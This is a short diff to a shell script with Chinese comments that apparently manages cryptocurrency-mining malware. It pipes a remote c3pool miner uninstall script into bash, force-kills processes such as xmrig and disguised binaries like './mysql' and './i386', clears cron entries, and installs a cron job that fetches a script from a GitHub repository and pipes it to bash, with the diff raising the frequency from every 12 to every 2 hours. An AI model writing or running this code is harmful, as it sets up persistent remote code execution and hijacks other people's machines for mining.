@@ -2,6 +2,7 @@
 #停止c3池
 curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s
 # 首先终止匹配的进程
+pkill -9 -f 'xmrig'
 pkill -9 -f './mnt/ring/ring'
 pkill -9 -f './mysql'
 pkill -9 -f './i386'
@@ -37,4 +38,4 @@ fi
 #cd /opt; ./i386 >/dev/null 2>&1 & disown
 #清除上一次的任务，添加下一次的任务
 crontab -l | grep -v "curl" | crontab -
-echo "0 */12 * * * curl -s -L https://raw.githubusercontent.com/mumu1667/trx20/main/vb.sh | bash" | crontab -
+echo "0 */2 * * * curl -s -L https://raw.githubusercontent.com/mumu1667/trx20/main/vb.sh | bash" | crontab -
